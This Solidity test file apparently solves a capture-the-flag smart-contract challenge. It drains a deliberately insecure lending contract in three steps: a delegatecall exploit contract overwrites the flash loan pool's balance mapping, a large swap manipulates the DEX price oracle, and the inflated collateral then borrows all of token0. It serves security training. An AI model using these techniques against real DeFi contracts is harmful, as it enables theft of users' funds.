// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
import {BoringToken} from "../src/tokens/tokenBoring.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";


contract Challenge3Test is Test {
    // dex & oracle
    InsecureDexLP oracleDex;
    // flash loan
    InSecureumLenderPool flashLoanPool;
    // borrow system, contract target to break
    BorrowSystemInsecureOracle target;

    // insecureum token
    IERC20 token0;
    // boring token
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {

        // create the tokens
        token0 = IERC20(new InSecureumToken(30000 ether));
        token1 = IERC20(new BoringToken(20000 ether));
        
        // setup dex & oracle
        oracleDex = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(oracleDex), type(uint256).max);
        token1.approve(address(oracleDex), type(uint256).max);
        oracleDex.addLiquidity(100 ether, 100 ether);

        // setup flash loan service
        flashLoanPool = new InSecureumLenderPool(address(token0));
        // send tokens to the flashloan pool
        token0.transfer(address(flashLoanPool), 10000 ether);

        // setup the target conctract
        target = new BorrowSystemInsecureOracle(address(oracleDex), address(token0), address(token1));

        // lets fund the borrow
        token0.transfer(address(target), 10000 ether);
        token1.transfer(address(target), 10000 ether);

        vm.label(address(oracleDex), "DEX");
        vm.label(address(flashLoanPool), "FlashloanPool");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "BoringToken");

    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        // IDEAS:
        // - the Oracle has 10_000 ether of each token
        // - we need some collateral in order to borrow
        // - all the previous contracts are used so we can drain the DEX and flashloan
        // - token1 has special rules in isSolvent and is multiplied by some price oracle
        // - manipulate tokenPrice somehow so that we aren't blocked by isSolvent
        //      - the price is determined by the DEX so might need to flashLoan that to change price
        // - the solution requires draining only token0 
        // - the flashloan contract only loans to other contracts so we need to use an exploit contract

        // Grab all 10_000 token0 from the vulnerable flashloan contract
        FlashloanExploit _flashloanExploit = new FlashloanExploit();
        vm.label(address(_flashloanExploit), "FlashloanExploit");

        flashLoanPool.flashLoan(
            address(_flashloanExploit),
            abi.encodeWithSignature(
                "exploit(address)", player
            )
        );
        flashLoanPool.withdraw(10000 ether);

        // swap token0 for token1 in DEX. should give us token1 and also increase its price
        token0.approve(address(oracleDex), 10000 ether);
        oracleDex.swap(address(token0), address(token1), 10000 ether);

        // Deposit all the tokens we got from the DEX as collateral to the Lender contract
        token1.approve(address(target), 10000 ether);
        target.depositToken1(token1.balanceOf(address(player)));

        // Take the target's balance of token0. We can do this because the Lender contract is reading the price of token1
        // from the DEX. The DEX now reports a very high price for token1 because we deposited a huge amount of token0
        // relative to the existing liquidity in the pool. As a result, from the point of view of the Lender, token0 is very cheap
        // and token1 is very valuable so it is happy to give us all of token0 since we've put down valuable collateral.
        target.borrowToken0(token0.balanceOf(address(target)));

        //============================//


        vm.stopPrank();

        assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");

    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/
contract Exploit {
    IERC20 token0;
    IERC20 token1;
    BorrowSystemInsecureOracle borrowSystem;
    InsecureDexLP dex;
}

contract FlashloanExploit {
    // Copy the layout of the vulnerable contract
    //using Address for address;
    //using SafeERC20 for IERC20;

    /// @dev Token contract address to be used for lending.
    //IERC20 immutable public token;
    IERC20 public token;
    /// @dev Internal balances of the pool for each user.
    mapping(address => uint) public balances;

    // flag to notice contract is on a flashloan
    bool private _flashLoan = false;
    InSecureumLenderPool pool;

    function exploit(address player) external {
        // Delegatecall allows us to execute functions using the calling contract's storage.
        // Here we can change the contract's internal balance to give us a token balance
        // just updating the entry for the player address in the contact's balance mapping.
        balances[player] = 10000 ether;
    }
}

